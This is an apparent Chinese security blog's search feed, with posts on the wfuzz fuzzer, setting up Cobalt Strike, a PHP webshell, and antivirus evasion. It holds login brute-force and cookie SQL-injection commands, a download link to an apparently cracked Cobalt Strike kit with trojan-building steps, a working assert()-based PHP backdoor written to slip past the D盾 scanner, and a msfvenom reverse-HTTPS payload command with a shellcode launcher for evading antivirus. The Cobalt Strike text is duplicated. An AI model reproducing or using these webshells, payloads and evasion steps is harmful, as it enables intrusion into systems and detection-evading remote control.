    <content type="text"><![CDATA[wfuzz工具介绍wfuzz是一个用来FUZZ的工具,他可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。还可以进行用户爆破,sql注入测试,绕过waff等等测试 wfuzz工具基本用法常用参数 12345678910111213141516171819202122232425262728293031323334要FUZZ的参数用FUZZ表示如果有3个就要这样第一个:FUZZ第二个:FUZ2Z第三个:FUZ3Z其他更多的参数以此类推payload的个数要与FUZZ的个数相等-c: 带颜色输出-z: payloads里面的参数(wfuzz -e payloads)常用的有 file,1.txt:加载1.txt文件,用文件内容作为payload range,1-10:代表用1到10作为payload list,1-2-3:代表用1,2,3作为参数。每个参数用-分割-d: 设置POST数据-b: 设置cookie头-H: 添加http头部-p: 代理(可以使用多个代理)-X: 请求方式-R: 设置递归深度-s: 设置超时时间-t: 设置线程-e: 编码-f: 保存–follow：遵循重定向--basic: Basic Auth下面的要设置多个值的话用,分割--hc: 不输出状态码等于你设置的状态码的响应包(比如设置为200,那就不会输出状态码等于200的包)--hl: 不输出行数等于你设置的行数的响应包--hw: 不输出字数等于你设置的字数的响应包--hh: 不输出字符数等于你设置的字符数的响应包--hs: 不输出响应包中包含你输入的字符串的响应包-sc: 输出状态码等于你设置的状态码的响应包--sl: 输出行数等于你设置的行数的响应包--sw: 输出字数等于你设置的字数的响应包--sh: 输出字符数等于你设置的字符数的响应包--ss: 输出响应包中包含你输入的字符串的响应包 界面介绍id:代表编号Response: 代表返回状态码(C=404代表返回404状态码)Lines: 代表返回的行数Word: 代表返回的字数Chars: 代表返回的字符数payload: 代表发出去的payload -c参数下面是一个无-c参数的$ wfuzz -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ一个有-c参数的wfuzz -c -z file,dir.txt --hc 404 http://172.16.5.2/FUZZ -z参数把文件内容当做payloadwfuzz -c -z file,dir.txt http://172.16.5.2/FUZZ用rang来当做payloadwfuzz -c -z range,10-20 --hc 404 http://172.16.5.2/FUZZ用list来当做payloadwfuzz -c -z list,20-a-b-upload-login --hc 404 http://172.16.5.2/FUZZ -d设置POST数据wfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; http://172.16.5.2/ -b设置cookie设置2个cookie,其中一个是user还有一个是passwdwfuzz -c -z list,20-a-b-upload-login -d &quot;user=FUZZ&quot; -b &quot;user=test&quot; -b &quot;passwd=test&quot; http://172.16.5.2/设置多个cookie要用多个-b -X参数设置请求方法wfuzz -c -z list,GET-POST-HEAD -X FUZZ http://172.16.5.2/ -p设置代理wfuzz -c -z list,20-a-b-upload-login -p 127.0.0.1:SOCKS4,127.0.0.1:SOCKS5 http://172.16.5.2/ -t设置线程wfuzz -c -z list,20-a-b-upload-login -t 30 http://172.16.5.2/ 实用技巧爆破目录wfuzz -c -z file,dir.txt --sc 403,200,304 http://172.16.5.2/FUZZ 爆破文件wfuzz -c -z file,dir.txt --sc 200,304 http://172.16.5.2/FUZZ.php 爆破账号密码第一种爆破(一个字典对应一个字典)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php第二种爆破(一个字典中的一个值直接对应另外一个字典的所有值)wfuzz -z list,a-b-c-admin -z list,1-2-3-admin -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 保存文件保存html文件wfuzz -c -z file,dir.txt -f 1,html http://172.16.5.96/FUZZ 对payload加密 wfuzz -z list,a-b-c-admin,base64 -z list,1-2-3-admin -m zip -d &quot;user=FUZZ&amp;password=FUZ2Z&quot; http://172.16.5.96/login/login.php 对cookie进行sql注入测试 wfuzz -z file,MSSQL.fuzz.txt -b &quot;sql=FUZZ&quot; http://172.16.5.96/login/login.php]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cobaltstrike(一)]]></title>
    <url>%2F2019%2F08%2F25%2Fcobaltstrike(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar 工具分享链接: https://pan.baidu.com/s/1dyNrdX-MJJadb7YOWBP3Dw 提取码: 4rhw 文件树1234567891011121314151617181920212223242526272829303132333435363738394041424344├── 48643_20161201044301.zip ├── agscript 拓展应用的脚本├── c2lint 检查c2配置文件的语法和预览├── cobaltstrike - 副本.bat window客户端├── cobaltstrike.bat ├── CobaltStrikeCN.jar 汉化程序├── cobaltstrike.jar 主要程序├── cobaltstrike.store├── data│ ├── archives.bin│ ├── c2info.bin│ ├── listeners.bin│ ├── sessions.bin│ └── targets.bin├── icon.jpg├── keytool.exe├── logs│ ├── 190317│ │ ├── 169.254.245.9│ │ │ ├── beacon_1031.log│ │ │ └── beacon_90986.log│ │ ├── events.log│ │ └── weblog.log│ └── 190825│ └── events.log├── peclone├── Readme-说明.htm├── Scripts 脚本│ ├── CVE-2018-4878.cna│ ├── elevate.cna│ ├── modules│ │ ├── cve-2015-1701.x64.dll│ │ ├── cve-2015-1701.x86.dll│ │ ├── cve-2016-0051.x86.dll│ │ ├── Invoke-EventVwrBypass.ps1│ │ ├── Invoke-MS16032.ps1│ │ └── Invoke-WScriptBypassUAC.ps1│ └── ProcessTree.cna├── teamserver 启动工具的脚本├── teamserver.bat window下启动工具的脚本└── third-party 第三方工具 ├── README.vncdll.txt ├── winvnc.x64.dll 64位的vnc └── winvnc.x86.dll 32位的vnc 工具运行进入目录执行先把服务端开好命令语法:./teamserver ip地址 密码 如图: 客户端连接: 命令:java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar开启汉化的命令是:java -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar第一次连接的服务器会显示服务端的SSL 证书的SHA256哈希值这个直接确定就可以了 如图: 然后点击连接就可以了 里面的目录就不介绍了,如果不懂的可以看https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikeji-ben-shi-yong/ji-ben-shi-yong-jie-shao.html 制作木马在制作木马之前先要创建一个监听器(类似msf的payload) 点击此按钮后点击add 然后进行配置 名字就是给监听器取的名字 payload反弹的方式(有beacon字符串的可以反弹到cs里面,有foreign可以用来把shell传递到其他工具) 主机:反弹到哪个ip上端口:反弹到的端口配置完成后点击save(遇到其他窗口点击确认就可以了) 如图代表添加成功: 然后制作木马 如图添加一个exe的木马 对木马进行配置, 监听器:选择自己生成监听器的名字输出:代表输出的格式然后点击Generate 运行该木马 派送一个shell给msf首先也要添加一个监听器 payload要选择foreign类型的主机填写是反弹到的ip端口填写反弹到的端口 配置完Cobalt Strike后配置msf 如图: 然后回到Cobalt Strike,右击目标选择增加会话 然后选择要派生给msf的那个监听器，在点Choose就可以了。 然后等个1分钟左右就可以看到msf收到了传递过来的shell 把msf的shell传递个Cobalt strike首先也要创建一个监听器,因为前面已经创建了一个名字为cs的监听器，所以我们这里直接使用那时候创建的那个监听器就可以了,然后我们对msf进行配置 先查看自己的session id 然后在对msf进行配置 然后就可以看到cobalt strike主机上线了]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常量过D盾]]></title>
    <url>%2F2019%2F08%2F03%2F%E5%B8%B8%E9%87%8F%E8%BF%87D%E7%9B%BE%2F</url>
    <content type="text"><![CDATA[常量过D盾1234567&lt;?php sprintf("123"); sprintf("123"); sprintf("123"); $a=$_GET['a']; define("Test", "$a",true); assert(TesT);]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shellcode分离免杀]]></title>
    <url>%2F2019%2F08%2F02%2Fshellcode%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%2F</url>
    <content type="text"><![CDATA[免杀原理病毒查杀一般分为:特征、行为和云查杀。这些查杀会针对PE头文件的查杀。payload文件越大的时候,越容易被查杀。 本篇文章采用特征与行为分离免杀。避免PE头文件，并且分离行为，与特征的综合免杀。 制作木马用msfvenom生成木马 msfvenom -p windows/meterpreter/reverse_https lhost=192.168.1.112 lport=4444 -e x86/shikata_ga_nai -i5 -f raw &gt; test.c 参数解释 -p:表示payload,因为用tcp的话，通信会被杀毒软件拦截通信导致反弹不了会话,所以使用https通信(因为https会加密) lhost:反弹shell的ip lport:反弹shell的端口 -e:选择编码方式 i:参数指定编码次数 -f:输出格式 下载shellcodeshellcode地址:https://github.com/clinicallyinane/shellcode_launcher/ 反弹shell设置msfconsole监听 记住payload要设置对,反正反弹的shell接收不了 然后用shell执行我们生成的木马就可以反弹shell了 查杀情况 文章声明此方法并非原创]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>shellcode</tag>
      </tags>
  </entry>
</search>
